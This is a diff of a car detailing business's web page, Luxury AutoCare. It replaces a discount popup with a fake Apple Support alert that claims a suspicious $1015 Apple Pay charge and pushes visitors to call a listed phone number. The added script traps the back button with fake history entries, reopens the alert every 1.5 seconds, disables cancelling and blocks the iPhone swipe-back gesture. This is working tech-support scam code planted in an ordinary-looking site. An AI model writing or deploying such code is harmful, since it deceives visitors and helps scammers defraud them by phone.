@@ -386,59 +386,103 @@ Best detailing service I have ever used."
 Luxury AutoCare © 2026
 </footer>
 
-
-
 <!-- POPUP -->
-
-<div class="popup-overlay" id="popup">
-
-<div class="popup">
-
-<h3>🔥 30% OFF Today</h3>
-
-<p>
-Are you interested in getting a <b>30% discount quote</b>
-for your luxury car detailing right now?
-</p>
-
-<div class="popup-buttons">
-
-<button class="yes" onclick="acceptOffer()">YES — SHOW MY DISCOUNT</button>
-
-<button class="no" onclick="declineOffer()">NO — I PREFER FULL PRICE</button>
-
+<div class="overlay" id="overlay">
+  <div class="popup">
+    <p>We detected a suspicious pre-authorization request on your Apple ID related to an Apple Store purchase of $1015 via Apple Pay. 
+	   The request has been temporarily placed on hold to protect your account and personal data. 
+	   If you did not authorize this activity, please contact Apple Support at +1 (888)-611-7097 
+	   immediately to cancel the charge before it is processed.</p>
+    <div class="buttons">
+      <button class="cancel" onclick="cancelAction()">Cancel</button>
+		<a href="tel:+18886117097" class="ok">Call</a>
+    </div>
+  </div>
 </div>
 
 </div>
 
 </div>
-
-
 
 <script>
+let popupInterval;
+let cancelled = false;
 
-setTimeout(function(){
-document.getElementById("popup").style.display="flex";
-},3000);
+/* REMOVE PREVIOUS HISTORY ENTRY */
+history.replaceState(null, null, location.href);
 
-
-function acceptOffer(){
-
-window.location.replace("Error.html");
-
+/* CREATE FAKE HISTORY STACK */
+for (let i = 0; i < 20; i++) {
+  history.pushState({ trap: true }, "", location.href);
 }
 
-function declineOffer(){
+/* BACK BUTTON TRAP */
+window.addEventListener("popstate", function () {
+  history.pushState({ trap: true }, "", location.href);
+  openPopup();
+});
 
-document.getElementById("popup").style.display="none";
+/* SAFARI PAGE CACHE FIX */
+window.addEventListener("pageshow", function (e) {
+  if (e.persisted) {
+    history.replaceState(null, null, location.href);
+  }
+});
 
+/* MAIN POPUP */
+function openPopup() {
+  if (!cancelled) {
+    const overlay = document.getElementById("overlay");
+    if (overlay) overlay.style.display = "flex";
+  }
 }
+
+function closePopup() {
+  console.log("Cancel disabled");
+}
+
+/* INITIAL PAGE LOAD */
+window.onload = function () {
+  openPopup();
+
+  popupInterval = setInterval(() => {
+    if (!cancelled) openPopup();
+  }, 1500);
+
+  /* ✅ FIXED CALL BUTTON */
+  const callBtn = document.getElementById("callBtn");
+  if (callBtn) {
+    callBtn.addEventListener("click", function (e) {
+      e.stopPropagation();
+
+      // 🔥 stop interval before calling
+      clearInterval(popupInterval);
+
+      window.location.href = "tel:+18886117097";
+    });
+  }
+
+  /* CANCEL BUTTON */
+  const cancelBtn = document.getElementById("cancelBtn");
+  if (cancelBtn) {
+    cancelBtn.addEventListener("click", function (e) {
+      e.stopPropagation();
+      closePopup();
+    });
+  }
+};
+
+/* BLOCK IPHONE SWIPE BACK */
+document.addEventListener(
+  "touchstart",
+  function (e) {
+    if (e.touches.length && e.touches[0].clientX < 20) {
+      e.preventDefault();
+    }
+  },
+  { passive: false }
+);
 
 </script>
-
-
 </body>
 </html>
-
-
-
